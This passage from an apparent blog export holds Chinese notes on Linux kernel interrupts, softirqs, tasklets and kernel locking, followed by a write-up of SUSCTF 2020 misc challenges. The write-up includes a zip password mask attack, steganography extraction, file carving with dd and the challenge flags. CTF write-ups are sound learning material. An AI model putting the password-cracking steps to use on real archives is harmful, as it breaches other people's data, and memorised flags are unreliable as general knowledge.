<li>设备使用中断时，会发生什么？</li>
</ul>
<p>如果设备使用中断，那相应的驱动程序就通过 <code>request_irq()</code> 函数<strong>注册一个中断处理程序</strong>，并<strong>激活给定的中断线</strong>以处理中断。（该函数声明位于 <code>&lt;linux/interrupt.h&gt;</code>，具体如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* request_irq 注册函数，分配一条给定的中断线，若成功执行则返回 0</span></span><br><span class="line"><span class="comment"> * irq       - 要分配的中断号</span></span><br><span class="line"><span class="comment"> * handler   - 指向实际处理这个中断的中断处理程序的指针</span></span><br><span class="line"><span class="comment"> * flags     - 中断处理程序标志位</span></span><br><span class="line"><span class="comment"> * name      - 中断相关的设备名称 ASCII 表示</span></span><br><span class="line"><span class="comment"> * dev       - 用于共享中断线</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">request_irq</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> irq,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">irq_handler_t</span> handler,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">unsigned</span> <span class="keyword">long</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">const</span> <span class="keyword">char</span> *name,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">void</span> *dev)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>中断处理程序标志</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>标志位</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>IRQF_DISABLED</td>
<td>内核在处理中断处理程序本身期间，要禁止所有的其他中断</td>
</tr>
<tr>
<td>IRQF_SAMPLE_RANDOM</td>
<td>表明设备产生的中断对内核熵池有贡献</td>
</tr>
<tr>
<td>IRQF_TIMER</td>
<td>为系统定时器的中断处理准备的</td>
</tr>
<tr>
<td>IRQF_SHARED</td>
<td>表示可以在多个中断处理程序之间共享中断线</td>
</tr>
</tbody>
</table>
</div>
<h3 id="7-5-释放中断处理程序"><a href="#7-5-释放中断处理程序" class="headerlink" title="7.5 释放中断处理程序"></a>7.5 释放中断处理程序</h3><ul>
<li>卸载驱动程序时，需要注销相应的中断处理程序，并释放中断线。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_irq</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> irq, <span class="keyword">void</span> *dev)</span>  <span class="comment">// 注销函数</span></span></span><br></pre></td></tr></table></figure>
<h3 id="7-6-中断上下文"><a href="#7-6-中断上下文" class="headerlink" title="7.6 中断上下文"></a>7.6 中断上下文</h3><div class="table-container">
<table>
<thead>
<tr>
<th>进程上下文</th>
<th>中断上下文</th>
</tr>
</thead>
<tbody>
<tr>
<td>可以通过 current 宏关联当前上下文</td>
<td>与 current 宏不相关（尽管它会指向被中断的进程）</td>
</tr>
<tr>
<td>可以睡眠</td>
<td>不可以睡眠</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>中断上下文有较为严格的时间限制（因为它打断了其他代码）</li>
<li>中断上下文的代码应当迅速，简洁（同上）</li>
<li>尽量把工作分离出来，放到下半部执行，因为下半部可以在更适合的时间运行</li>
</ul>
<h3 id="7-7-中断处理机制的实现（中断从硬件到内核的路由）"><a href="#7-7-中断处理机制的实现（中断从硬件到内核的路由）" class="headerlink" title="7.7 中断处理机制的实现（中断从硬件到内核的路由）"></a>7.7 中断处理机制的实现（中断从硬件到内核的路由）</h3><p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210702151130093.png" alt="image-20210702151130093"></p>
<ol>
<li>硬件产生中断，通过总线把电信号传给中断控制器</li>
<li>如果中断线是激活的，中断就会被传给处理器</li>
</ol>
<p>中断处理机制中，内核调用的函数涉及：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>do_IRQ()</td>
<td>提取中断的值，对接收的中断进行应答</td>
</tr>
<tr>
<td>handle_IRQ_event()</td>
<td>运行当前中断线所安装的中断处理程序（定义在 <code>kernel/irq/handler.c</code>）</td>
</tr>
<tr>
<td>ret_from_intr()</td>
<td>1. 如果重新调度正在被挂起，<br>&emsp;a. 且内核正在返回用户空间（即中断了用户进程），则调用 schedule()<br>&emsp;b. 且内核正在返回内核空间（即中断了内核本身），则只有在 preempt_count 为 0 时，才调用 schedule()<br>2. 未被挂起，则恢复原来的寄存器，内核恢复到曾经中断的点</td>
</tr>
</tbody>
</table>
</div>
<h4 id="拓展-procfs-虚拟文件系统"><a href="#拓展-procfs-虚拟文件系统" class="headerlink" title="拓展 - procfs 虚拟文件系统"></a>拓展 - procfs 虚拟文件系统</h4><p>procfs 只存在于内核内存，一般位于 <code>/proc</code> 目录，procfs 中读写文件都要调用内核函数。<code>/proc/interrupts</code> 存放的是系统中与中断相关的统计信息</p>
<p>具体如下图示</p>
<p>注意因为这里试验机有两个处理器，所以部分列会多一列出来</p>
<ul>
<li>第一列：中断线</li>
<li>第二列：一个接收中断数目的计数器</li>
<li>第三列：中断控制器</li>
<li>第四列：设备名</li>
</ul>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210702152502338.png" alt="image-20210702152502338" style="zoom:80%;"></p>
<h3 id="7-8-中断控制方法"><a href="#7-8-中断控制方法" class="headerlink" title="7.8 中断控制方法"></a>7.8 中断控制方法</h3><p>可以禁止当前处理器的中断系统或屏蔽一条中断线。具体接口可以在 <code>&lt;asm/system.h&gt;</code> 和 <code>&lt;asm/irq.h&gt;</code> 找到。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>local_irq_disable()</td>
<td>禁止本地中断传递</td>
</tr>
<tr>
<td>local_irq_enable()</td>
<td>激活本地中断传递</td>
</tr>
<tr>
<td>local_irq_save()</td>
<td>保存本地中断传递的当前状态，然后禁止本地中断传递</td>
</tr>
<tr>
<td>local_irq_resotre()</td>
<td>恢复本地中断传递到给定状态</td>
</tr>
<tr>
<td>disable_irq()</td>
<td>禁止给定中断线，并确保该函数返回之前在该中断线上并没有处理程序在运行</td>
</tr>
<tr>
<td>disable_irq_nosync()</td>
<td>禁止给定中断线</td>
</tr>
<tr>
<td>enable_irq()</td>
<td>激活给定中断线</td>
</tr>
<tr>
<td>irqs_disabled()</td>
<td>本地中断传递被禁止，则返回 0；否则非 0</td>
</tr>
<tr>
<td>in_interrupt()</td>
<td>1. 在中断上下文，则返回非 0<br>2. 在进程上下文，则返回 0</td>
</tr>
<tr>
<td>in_irq()</td>
<td>1. 当前正在执行中断处理程序，返回非 0<br>2. 不在执行，返回 0</td>
</tr>
</tbody>
</table>
</div>
<h2 id="第-8-章-中断处理的下半部工作"><a href="#第-8-章-中断处理的下半部工作" class="headerlink" title="第 8 章 - 中断处理的下半部工作"></a>第 8 章 - 中断处理的下半部工作</h2><h3 id="8-1-为什么将中断处理流程分成上下两个部分？"><a href="#8-1-为什么将中断处理流程分成上下两个部分？" class="headerlink" title="8.1 为什么将中断处理流程分成上下两个部分？"></a>8.1 为什么将中断处理流程分成上下两个部分？</h3><p>因为<strong>中断处理程序</strong>本身是有<font color="blue">局限</font>的。</p>
<ol>
<li><p><font color="blue">中断处理程序越快越好</font></p>
<ul>
<li>中断处理程序<strong>异步执行</strong>，有可能会打断某些重要代码，为避免被打断的代码停止时间过长，就需要中断处理程序越快越好</li>
<li>为防止太多其他中断被屏蔽，而导致硬件与操作系统无法通信，中断处理程序需要越快越好</li>
<li>中断处理程序往往要操作硬件，所以有很高的时限要求</li>
</ul>
</li>
<li><p>中断处理程序不在进程上下文中运行，所以<font color="blue">不能阻塞</font>。</p>
</li>
</ol>
<p>所以，中断处理程序只能实现那些时间要求很严格的操作，其他操作就被退后到中断被激活以后再运行。</p>
<h3 id="8-2-下半部做哪些工作？"><a href="#8-2-下半部做哪些工作？" class="headerlink" title="8.2 下半部做哪些工作？"></a>8.2 下半部做哪些工作？</h3><font color="blue">中断处理程序以外的工作</font>。那先大致捋一下**中断处理程序工作范畴**：  

1. 对时间非常敏感的  

2. 跟硬件相关的  

3. 要保证不被其他中断打断的  

### 8.3 下半部的实现机制

上半部的实现机制只有一种，那就是中断处理程序。下半部的实现机制包括：  

1. <font color="blue">软中断 softirqs</font> （编译期间静态分配）  
2. <font color="blue">tasklet</font> （最常用，通过软中断实现。动态注册）  
3. <font color="blue">工作队列 work queues</font>  

<div class="table-container">
<table>
<thead>
<tr>
<th>下半部机制</th>
<th>上下文</th>
<th>顺序执行保障</th>
<th>复杂程度</th>
<th>性能</th>
</tr>
</thead>
<tbody>
<tr>
<td>软中断</td>
<td>中断</td>
<td>没有</td>
<td>高</td>
<td>好</td>
</tr>
<tr>
<td>tasklet</td>
<td>中断</td>
<td>同类型不能同时执行</td>
<td>中等</td>
<td>中等</td>
</tr>
<tr>
<td>工作队列</td>
<td>进程</td>
<td>没有（和进程上下文一样被调度）</td>
<td>简单</td>
<td>差（开销最大）</td>
</tr>
</tbody>
</table>
</div>
<h4 id="8-3-1-软中断的实现与使用"><a href="#8-3-1-软中断的实现与使用" class="headerlink" title="8.3.1 软中断的实现与使用"></a>8.3.1 软中断的实现与使用</h4><h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><p><code>kernel/sofrirq.c</code> 中实现</p>
<ol>
<li>软中断处理程序 action 的函数原型：</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">softirq_handler</span><span class="params">(struct softirq_action *)</span></span></span><br></pre></td></tr></table></figure>
<p>一个软中断不会被另一个软中断抢占，只会被中断处理程序抢占。不过其他软中断可以在其他处理器同时执行</p>
<ol>
<li>执行软中断</li>
</ol>
<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><ol>
<li><font color="blue">分配索引</font>

<p>内核用从 0 开始的索引表示优先级，索引值越小，优先级越高。如果想自己建立新的软中断，就要在这个表示索引的<font color="blue">枚举类型</font>中加入对应的项，由于索引值与优先级相关，所以还不能随便加，应根据优先级确定加入的位置。（这个枚举类型在 <code>&lt;linux/interrupt.h</code>）习惯上，HI_SOFTIRQ 在第一项，RCU_SOFTIRQ 在最后一项，新加入的软中断对应索引一般在 BLOCK_SOFTIRQ 和 TASKLET_SOFTIRQ 之间。</p>
<ul>
<li>tasklet 类型列表</li>
</ul>
</li>
</ol>
<div class="table-container">
<table>
<thead>
<tr>
<th>tasklet</th>
<th>优先级</th>
<th>软中断描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>HI_SOFTIRQ</td>
<td>0</td>
<td>优先级高的 tasklets</td>
</tr>
<tr>
<td>TIMER_SOFTIRQ</td>
<td>1</td>
<td>定时器的下半部</td>
</tr>
<tr>
<td>NET_TX_SOFTIRQ</td>
<td>2</td>
<td>发送网络数据包</td>
</tr>
<tr>
<td>NET_RX_SOFTIRQ</td>
<td>3</td>
<td>接收网络数据包</td>
</tr>
<tr>
<td>BLOCK_SOFTIRQ</td>
<td>4</td>
<td>BLOCK 装置</td>
</tr>
<tr>
<td>TASKLET_SOFTIRQ</td>
<td>5</td>
<td>正常优先级的 tasklets</td>
</tr>
<tr>
<td>SCHED_SOFTIRQ</td>
<td>6</td>
<td>调度程度</td>
</tr>
<tr>
<td>HRTIMER_SOFTIRQ</td>
<td>7</td>
<td>高分辨率定时器</td>
</tr>
<tr>
<td>RCU_SOFTIRQ</td>
<td>8</td>
<td>RCU 锁定</td>
</tr>
</tbody>
</table>
</div>
<ol>
<li><p>通过 <code>open_softirq()</code> <font color="blue">注册软中断处理程序</font>。</p>
<p>这个函数有两个参数：软中断的索引号，处理函数</p>
</li>
<li><font color="blue">触发软中断</font>

<p>经过枚举类型添加新项和注册，新的软中断处理程序就可以运行了。<code>raise_softirq()</code> 可以将一个软中断设置为<font color="blue">挂起</font>状态，让它下次调用 <code>do_softirq()</code> 即可投入使用。</p>
</li>
</ol>
<h4 id="8-3-2-tasklet"><a href="#8-3-2-tasklet" class="headerlink" title="8.3.2 tasklet"></a>8.3.2 tasklet</h4><h5 id="结构体及值的说明"><a href="#结构体及值的说明" class="headerlink" title="结构体及值的说明"></a>结构体及值的说明</h5><p>tasklet 由软中断实现，本质相似，但<strong>接口更简单，锁保护要求更低</strong>。</p>
<p><strong>tasklet 结构体</strong>定义在 <code>&lt;linux/interrupt.h&gt;</code> </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span> *<span class="title">next</span>;</span>  <span class="comment">// 链表中的下一个 tasklet</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> state;  <span class="comment">// tasklet 状态</span></span><br><span class="line">	<span class="keyword">atomic_t</span> count;  <span class="comment">// tasklet 引用的计数武器</span></span><br><span class="line">	<span class="keyword">void</span> (*func)(<span class="keyword">unsigned</span> <span class="keyword">long</span>);  <span class="comment">// tasklet 处理函数</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> data;  <span class="comment">// 给 tasklet 处理函数的参数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>tasklet 状态值（state）：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>状态值</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>未被调度</td>
</tr>
<tr>
<td>TASKLET_STATE_SCHED</td>
<td>tasklet 已调度，正准备投入运行</td>
</tr>
<tr>
<td>TASKLET_STATE_RUN</td>
<td>tasklet 正在运行</td>
</tr>
</tbody>
</table>
</div>
<p>计数器值（count）：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>计数器值</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>非 0</td>
<td>tasklet 被禁止，不允许执行</td>
</tr>
<tr>
<td>0</td>
<td>tasklet 被激活，并被设为挂起状态，可执行</td>
</tr>
</tbody>
</table>
</div>
<font color="blue">所有的 tasklet 都通过重复运用 HI_SOFTIRQ 和 TASKLET_SOFTIRQ 这两个软中断实现。</font>  

<p>一个 tasklet 被调度，内核就会唤醒这两个软中断中的一个  </p>
<h5 id="使用-tasklet"><a href="#使用-tasklet" class="headerlink" title="使用 tasklet"></a>使用 tasklet</h5><ol>
<li><p>声明</p>
<p>静态声明</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DECLARE_TASKLET(my_tasklet, my_tasklet_handler, dev);</span><br></pre></td></tr></table></figure>
<p>等价于</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span> <span class="title">my_tasklet</span> =</span> &#123;<span class="literal">NULL</span>, <span class="number">0</span>, ATOMIC_INIT(<span class="number">0</span>),</span><br><span class="line">                                   	my_tasklet_handler, dev&#125;;</span><br></pre></td></tr></table></figure>
<p>​    动态声明</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">tasklet_init(t, tasklet_handler, dev);</span><br></pre></td></tr></table></figure>
<ol>
<li>编写自己的 tasklet 处理程序</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tasklet_handler</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> data)</span></span></span><br></pre></td></tr></table></figure>
<ol>
<li>调度自己的 tasklet</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">tasklet_schedule(&amp;my_tasklet);  <span class="comment">/* 把 my_tasklet 标记为挂起 */</span> </span><br></pre></td></tr></table></figure>
<h5 id="内核是如何处理软中断的？"><a href="#内核是如何处理软中断的？" class="headerlink" title="内核是如何处理软中断的？"></a>内核是如何处理软中断的？</h5><p>方案说明  </p>
<div class="table-container">
<table>
<thead>
<tr>
<th>方案</th>
<th>说明</th>
<th>优</th>
<th>缺</th>
</tr>
</thead>
<tbody>
<tr>
<td>一</td>
<td><strong>本次执行全部处理</strong>（只要还有被触发并等待处理的软中断，本次执行就要负责处理，重新触发的软中断也在本次执行返回前被处理）</td>
<td>可以<strong>即时</strong>处理内核的软中断</td>
<td>负载较高时，会有大量重复触发的软中断，用户空间的任务就会被忽略（<strong>用户空间处于饥饿状态</strong>）</td>
</tr>
<tr>
<td>二</td>
<td><strong>不处理重新触发的软中断</strong>（等下一个软中断执行去处理）</td>
<td>用户不饥饿了</td>
<td>软中断可能饥饿</td>
</tr>
<tr>
<td>三</td>
<td>折中。<br>1. 不立即处理重新触发的软中断<br>2. 大量软中断出现时，内核唤醒一组低优先级的内核线程来处理这些负载。</td>
<td>1. 负载高，用户也不会饥饿<br>2. 空闲时，软中断处理也很快</td>
</tr>
</tbody>
</table>
</div>
<h4 id="8-3-3-工作队列-work-queue"><a href="#8-3-3-工作队列-work-queue" class="headerlink" title="8.3.3 工作队列 work queue"></a>8.3.3 工作队列 work queue</h4><ol>
<li><p>特点</p>
<ul>
<li><p>靠内核线程实现</p>
</li>
<li><p>可以<font color="blue">将工作推后执行</font>，交由一个内核线程去执行</p>
</li>
<li><p>工作队列<font color="blue">允许重新调度，甚至睡眠</font></p>
</li>
</ul>
</li>
<li><p>怎么在工作队列和软中断/tasklet 中做选择？</p>
<ul>
<li><p>看推后执行的任务，<strong>是否需要睡眠</strong>。要睡眠就工作队列。</p>
</li>
<li><p><strong>是否需要重新调度</strong>，需要则工作队列</p>
</li>
</ul>
<p>如果不需要用一个内核线程来推后执行工作，就还是选 tasklet</p>
</li>
</ol>
<h2 id="第-9-章-内核同步介绍"><a href="#第-9-章-内核同步介绍" class="headerlink" title="第 9 章 - 内核同步介绍"></a>第 9 章 - 内核同步介绍</h2><ul>
<li><p>为什么要做内核同步？</p>
<p>防止共享资源并发访问。（并发访问，可能会发生各线程间相互覆盖共享数据的情况。这会导致系统不稳定，且问题不好定位）</p>
</li>
</ul>
<h3 id="9-1-临界区和竞争条件"><a href="#9-1-临界区和竞争条件" class="headerlink" title="9.1 临界区和竞争条件"></a>9.1 临界区和竞争条件</h3><ul>
<li><p>临界区：临界段，就是访问和操作共享数据的<strong>代码段</strong>。</p>
</li>
<li><p>竞争条件：两个线程在同一临界区同时执行，就存在竞争。</p>
</li>
</ul>
<script type="math/tex; mode=display">同步=避免并发+防止竞争条件</script><h3 id="9-2-锁机制"><a href="#9-2-锁机制" class="headerlink" title="9.2 锁机制"></a>9.2 锁机制</h3><ul>
<li>本质：给临界区加锁，保证临界区只存在一个执行线程。</li>
</ul>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210706155926907.png" alt="image-20210706155926907" style="zoom:67%;"></p>
<ul>
<li><p>锁机制之间的主要区别</p>
<p>一些锁被争用时，就简单执行<strong>忙等待</strong>；另外一些锁会<strong>使当前任务睡眠</strong>直到锁可用。</p>
</li>
<li><p>造成并发执行的原因</p>
</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>竞争条件成因</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>中断</td>
<td>中断随时可能发生，可能随时打断正在执行的代码</td>
</tr>
<tr>
<td>软中断和 tasklet</td>
<td>内核能随时可能唤醒或调度软中断和 tasklet，也就随时可能打断正在执行的代码</td>
</tr>
<tr>
<td>内核抢占</td>
<td>内核具有抢占性，内核中的任务可能会被另一个任务抢占</td>
</tr>
<tr>
<td>睡眠及与用户空间的同步</td>
<td>在内核执行的进程可能会睡眠，这就会唤醒调度程序，从而导致调度一个新的用户进程执行</td>
</tr>
<tr>
<td>对称多处理</td>
<td>多个处理器同时执行代码</td>
</tr>
</tbody>
</table>
</div>
<h4 id="编写内核代码时需要考虑的问题"><a href="#编写内核代码时需要考虑的问题" class="headerlink" title="编写内核代码时需要考虑的问题"></a>编写内核代码时需要考虑的问题</h4><ol>
<li>这个数据是不是全局的？除了当前线程外，其他线程能不能访问它？</li>
<li>这个数据会不会在进程上下文和中断上下文中共享？它是不是要在两个不同的中断处理程序中共享？</li>
<li>进程在访问数据时有没有可能被抢占？被调度的新程序会不会访问同一数据？</li>
<li>当前进程会不会睡眠（阻塞）在某些资源上，如果会，它会让共享数据处于何种状态？</li>
<li>怎样防止数据失控？</li>
<li>如果这个函数又在另一个处理器上被调度将会发生什么？</li>
<li>如何确保代码远离并发威胁？</li>
</ol>
<h3 id="9-3-死锁"><a href="#9-3-死锁" class="headerlink" title="9.3 死锁"></a>9.3 死锁</h3><ul>
<li><p>发生死锁的原因</p>
<p>每个线程都在相互等待，但是所有资源都被占用了，它们也不释放已经占用的资源，导致任何线程都无法继续，因此产生死锁。</p>
</li>
</ul>
<h4 id="9-3-1-实例"><a href="#9-3-1-实例" class="headerlink" title="9.3.1 实例"></a>9.3.1 实例</h4><ul>
<li>最简单的死锁：<strong>自死锁</strong></li>
</ul>
<p>一个执行线程想获得自己已经拥有的锁，它就等待这个锁，但是自己又不会释放这个锁，最终导致死锁。</p>
<ul>
<li>常见的 ABBA 锁</li>
</ul>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210706164827753.png" alt="image-20210706164827753" style="zoom: 50%;"></p>
<h4 id="9-3-2-如何避免死锁"><a href="#9-3-2-如何避免死锁" class="headerlink" title="9.3.2 如何避免死锁"></a>9.3.2 如何避免死锁</h4><ol>
<li><strong>按顺序加锁</strong>（最重要）</li>
<li>防止发生饥饿</li>
<li>不重复请求同一个锁</li>
<li>设计力求简单（越复杂的加锁方案越容易死锁）</li>
</ol>
<h3 id="9-4-加锁粒度"><a href="#9-4-加锁粒度" class="headerlink" title="9.4 加锁粒度"></a>9.4 加锁粒度</h3><ul>
<li><p>加锁机制发展到细粒度（fine-grained）加锁后，有什么好处？</p>
<p>Linux 从 2.0 版内核，刚加入对多处理器支持的时候，一个时刻只能有一个任务在内核中执行。2.2 版本加锁机制发展到细粒度加锁后，不再有这样的限制。</p>
</li>
<li><p>粒度的粗细，有什么影响？</p>
</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>加锁粒度</th>
<th>扩展性</th>
<th>复杂度</th>
<th>开销</th>
<th>加锁保护的数据规模</th>
</tr>
</thead>
<tbody>
<tr>
<td>粗</td>
<td>差</td>
<td>低</td>
<td>小</td>
<td>大</td>
</tr>
<tr>
<td>细</td>
<td>好</td>
<td>高</td>
<td>大</td>
<td>小</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>锁的争用：锁正被占用时，有其他线程试图获得该锁。</li>
</ul>
<h2 id="第-10-章-内核同步方法"><a href="#第-10-章-内核同步方法" class="headerlink" title="第 10 章 - 内核同步方法"></a>第 10 章 - 内核同步方法</h2><h3 id="10-1-原子操作"><a href="#10-1-原子操作" class="headerlink" title="10.1 原子操作"></a>10.1 原子操作</h3>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Linux内核</tag>
      </tags>
  </entry>
  <entry>
    <title>SUS2020</title>
    <url>/2020/10/20/SUS2020/</url>
    <content><![CDATA[<h4 id="分数-3287"><a href="#分数-3287" class="headerlink" title="分数 3287"></a>分数 3287</h4><h4 id="排名-15"><a href="#排名-15" class="headerlink" title="排名 15"></a>排名 15</h4><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><h4 id="Misc-签到"><a href="#Misc-签到" class="headerlink" title="[Misc]签到"></a>[Misc]签到</h4><p>SUSCTF{Welcome_t0_SUSCTF}</p>
<h4 id="Misc-爆破鬼才请求出战"><a href="#Misc-爆破鬼才请求出战" class="headerlink" title="[Misc]爆破鬼才请求出战"></a>[Misc]爆破鬼才请求出战</h4><h5 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>打开会有提示<code>m?s?_?tt4?k!</code><br><img src="/2020/10/20/SUS2020/baopo.png" alt>  </li>
<li>利用ARCHPR掩码攻击获取密码<br><img src="/2020/10/20/SUS2020/掩码攻击.png" alt><br><code>m4sk_att4Ck!</code>  </li>
<li><p>解压得到LSB.png，利用StegSolve提取隐写数据，保存成文本，得到<br><code>S&#123;urgdt1&#125;UY_30__sS0a_04mc</code>  </p>
</li>
<li><p>栅栏密码，每组3字<br><code>SUS&#123;Y0u_ar3_g00d_4t_m1sc&#125;</code></p>
</li>
</ol>
<h4 id="Misc-签到之公众号"><a href="#Misc-签到之公众号" class="headerlink" title="[Misc]签到之公众号"></a>[Misc]签到之公众号</h4><p>关注公众号，回复flag<br><code>SUSCTF&#123;W3lc0m3_t0_SUSCTF&#125;</code></p>
<h4 id="Misc-Dance-Dance"><a href="#Misc-Dance-Dance" class="headerlink" title="[Misc]Dance_Dance"></a>[Misc]Dance_Dance</h4><h5 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p>图片<br><img src="/2020/10/20/SUS2020/The_dancing_men.png" alt>  </p>
</li>
<li><p>利用<a href="https://www.dcode.fr/dancing-men-cipher解密得到">https://www.dcode.fr/dancing-men-cipher解密得到</a>  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pa sswdL etU  </span><br><span class="line">sdanCe</span><br></pre></td></tr></table></figure>
</li>
<li><p>根据提示“让我们跟着音乐起舞吧！”，使用<code>binwalk</code>查看是否内含文件，发现zip，故<code>dd if=The_dancing_men.png of=f.zip skip=48243 bs=1</code>将压缩包分离出来  </p>
</li>
<li>解压发现需要密码，正是<code>LetUsdanCe</code>  </li>
<li>得到音频文件Do_u_know_spectrum.wav，用Audacity打开，并查看频谱图有：<br><img src="/2020/10/20/SUS2020/spec.png" alt>  </li>
<li>扫描二维码得<br><code>SUS&#123;1nt3r35t1nG_5p3ctRum&#125;</code></li>
</ol>
<h4 id="Misc-balɟ¯ʇuᴉɹԀ"><a href="#Misc-balɟ¯ʇuᴉɹԀ" class="headerlink" title="[Misc]ƃɐlɟ¯ʇuᴉɹԀ"></a>[Misc]ƃɐlɟ¯ʇuᴉɹԀ</h4><h5 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>用010Editor查看发现尾部有类似zip文件头的标志，但整个字节流是倒序的，故利用Python顺过来  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\ti_nepo_ot_woh&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\sus.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> m:</span><br><span class="line">    m.write(binascii.b2a_hex(f))</span><br><span class="line"></span><br><span class="line">tmp = <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\sus.zip&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="built_in">print</span>(tmp[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\result.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> result:</span><br><span class="line">    result.write(binascii.a2b_hex(tmp[::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
<ol>
<li><p>得到一个可以正常解压缩的zip文件result.zip，解压缩得到here_are_some_codes.zip和use_zipin_to_get_password.txt，后者中有以下文本  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tyud0ko3aMDa1MttNDoaaunr0NtMtw:moy3aryoimi:uu:0m01aiypiuDaMmukaNrNM?M:M:mnnnt1rmDp?001Nanow:u?kN:0ykkyaMDkyMuDNMpuaNDykNm:NmmMMk1pki0idodmanMimupwwDooiy:i:kodmMOOa?k1witMk:aukiiM:iakDmni3w3?mwioiDooM:wiMrm:m0ooO:OokNMykNNwimOak0ddmopOmymuNo1aM0Mdt1?1Domynmnmw:0:o:uD30mDDyi:Dppi3a0Nmi:yOr??OOkdwwip3wr0u3aw1Mw:irrmtpkMd0n0kyD:3y:odnMDuiDNyaNMpyNykm:puw0?:DNrMoMkMDk3Nk03wtiO0mpoyidymtdiiD3O3Oa1yin?o3wDm3:mamduayD0:?iur?uwn:N001uioDa3Dumd3kukmdadmOaodn:iioy:nimnauu31nk0tda?rpoi1i1ioMOmi0MyyMktmNM::mOi3oMyMwMopoMtMu?ka:nmM3D:NyydpuymN1pO0mwoymraDiymMOd:pODuMmy0nDOMO0id3:ydDdrkNi0yoD1imOoDm0kinwyMi?MONm0Nyood:ONDdi:oyw0OM1:?:w?pitkOoa0:dtraiurNyyrN3uw1uwMyDtp10Ma:MMo:moMirupDmioOadOitwDt:yy0D:i3Na:naoMatra1uMrNwndiku3m?mOuda:OM1wnyourkau1dDw:oM:1myoNNDkk:ka3p?rywDwiakDa3d:i0Mo3a3M3aMkry0ionkmO3:?waO:MM0MNNymar3pmudwompwuoo0mOOyDNak1aDiow13yr?mNikw?royu?p1Dkm